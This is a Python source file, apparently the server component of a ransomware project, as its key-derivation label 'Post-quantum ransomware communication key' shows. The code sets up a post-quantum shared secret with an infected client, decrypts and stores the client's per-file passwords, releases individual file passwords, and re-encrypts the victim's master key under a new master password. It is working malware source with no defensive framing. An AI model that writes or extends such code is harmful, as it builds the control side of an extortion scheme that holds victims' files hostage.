import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import decrypt
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id

KEY_SIZE = 32  # 256 bits for AES-256
IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
SALT_SIZE = 16  # Size of the salt for Argon2id


class Server:
    kem_secret_key: bytes
    communication_key: bytes
    client_passwords: list[str]

    def __init__(self, kem_secret_key):
        self.kem_secret_key = kem_secret_key

    def establish_shared_secret(self, ciphertext: bytes) -> bytes:
        """
        Establish a shared secret with the client using ML-KEM.

        :param self: The Server instance.
        :param ciphertext: The ciphertext received from the client.
        :return: The recovered plaintext shared secret.
        :rtype: bytes
        """

        plaintext_recovered = decrypt(self.kem_secret_key, ciphertext)
        self.shared_secret = plaintext_recovered

        return plaintext_recovered

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Server instance.
        :param shared_secret: The shared secret established with the client.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=KEY_SIZE,
            salt=None,
            info=b"Post-quantum ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_client_passwords(
        self, passwords_iv: bytes, passwords_ciphertext: bytes, passwords_tag: bytes
    ):
        """
        Get client's files passwords.

        :param self: The Server instance.
        :param passwords_iv: The IV used for encrypting the client's passwords.
        :param passwords_ciphertext: The ciphertext of the client's passwords.
        :param passwords_tag: The authentication tag for the client's passwords.
        :return: None
        """

        cipher = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(passwords_iv, passwords_tag),
        )
        decryptor = cipher.decryptor()
        passwords_plaintext = (
            decryptor.update(passwords_ciphertext) + decryptor.finalize()
        )

        self.client_passwords = passwords_plaintext.decode("utf-8").splitlines()

    def send_password(self, file_id) -> str:
        """
        Send the password for a specific file to the client.
        :param self: The Server instance.
        :param file_id: The ID of the file for which to send the password.
        :return: The password for the specified file.
        :rtype: str
        """

        return self.client_passwords[file_id]

    def derive_password_key(self, password: str, salt: bytes) -> bytes:
        """
        Derive a key from a password using Argon2id.

        :param self: The Server instance.
        :param password: The password to derive the key from.
        :param salt: The salt to use for key derivation.
        :return: The derived password key.
        :rtype: bytes
        """

        kdf = Argon2id(
            salt=salt,
            length=KEY_SIZE,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def change_master_password(
        self,
        master_key_iv: bytes,
        master_key_ciphertext: bytes,
        master_key_tag: bytes,
        master_password_salt: bytes,
        new_master_password: str,
    ) -> tuple[bytes, bytes, bytes, bytes]:
        """
        Change the master password for the client.

        :param self: The Server instance.
        :param master_password_iv: The IV used for encrypting the master password.
        :param master_password_ciphertext: The ciphertext of the master password.
        :param master_password_tag: The authentication tag for the master password.
        :param salt: The salt used for deriving the master password key.
        :param new_master_password: The new master password to set.
        :return: A tuple containing the new master password IV, ciphertext, tag, and salt.
        :rtype: tuple[bytes, bytes, bytes, bytes]
        """
        print("Old password:", self.client_passwords[0])
        print("New password:", new_master_password)

        # Decrypt the master key
        master_password_key = self.derive_password_key(
            self.client_passwords[0], master_password_salt
        )
        cipher = Cipher(
            algorithms.AES(master_password_key),
            modes.GCM(master_key_iv, master_key_tag),
        )
        decryptor = cipher.decryptor()
        master_key = decryptor.update(master_key_ciphertext) + decryptor.finalize()

        # Encrypt the master key with the new password
        new_master_password_salt = os.urandom(SALT_SIZE)
        new_master_password_key = self.derive_password_key(
            new_master_password, new_master_password_salt
        )
        new_master_key_iv = os.urandom(IV_SIZE)
        cipher = Cipher(
            algorithms.AES(new_master_password_key),
            modes.GCM(new_master_key_iv),
        )
        encryptor = cipher.encryptor()
        new_master_key_ciphertext = encryptor.update(master_key) + encryptor.finalize()
        new_master_key_tag = encryptor.tag

        # Update the stored master password
        self.client_passwords[0] = new_master_password

        return (
            new_master_key_iv,
            new_master_key_ciphertext,
            new_master_key_tag,
            new_master_password_salt,
        )
